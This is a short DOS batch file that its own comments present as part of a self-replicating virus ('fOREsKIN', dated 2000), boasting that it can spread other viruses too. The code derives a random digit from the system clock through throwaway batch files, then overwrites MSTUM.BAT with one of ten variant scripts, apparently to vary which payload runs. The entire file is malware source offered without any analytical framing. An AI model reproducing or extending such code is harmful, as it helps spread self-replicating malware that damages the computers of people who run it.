@ECHO OFF
REM fOREsKIN sElf rEPlIcAToR vERSION 1.07c final CHAoS (C) 2000 EMD LABS INC
REM rAndOm dEvIStAtOr
REM nOt pErFECt, bUt iT sERvES iTS pUrPosE....bAtCh fIlE pROgRAMmINg
REM sInCe tHis vIrUs uSeS aN .eXe fILe iT cAn pOtEnTiAllY sPReAD otHeR vIRuSeS oThER tHAn iTsElF...cOoL!!!
REM wAs nOt cREaTED bY tHE sAMe pERsON tHAT wROtE tHe nETwORk.vBs sHIt
REM iT wAs jUsT iN mY wAy
echo.|time|find "Current" >cu##ent.bat
echo set time=%%3> current.bat
call cu##ent.bat
del cu??ent.bat > nul
echo = | choice /c=%time%= temp2.bat > temp1.bat
echo shift>temp2.bat
echo shift>>temp2.bat
echo set RANDOM=%%9>>temp2.bat
call temp1.bat
del temp?.bat > nul
if %RANDOM%== 9 COPY /y C:\PROGRA~1\FORESKIN\A.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 8 COPY /y C:\PROGRA~1\FORESKIN\B.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 7 COPY /y C:\PROGRA~1\FORESKIN\C.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 6 COPY /y C:\PROGRA~1\FORESKIN\D.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 5 COPY /y C:\PROGRA~1\FORESKIN\E.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 4 COPY /y C:\PROGRA~1\FORESKIN\F.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 3 COPY /y C:\PROGRA~1\FORESKIN\G.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 2 COPY /y C:\PROGRA~1\FORESKIN\H.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 1 COPY /y C:\PROGRA~1\FORESKIN\I.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
if %RANDOM%== 0 COPY /y C:\PROGRA~1\FORESKIN\J.BAT C:\PROGRA~1\FORESKIN\MSTUM.BAT
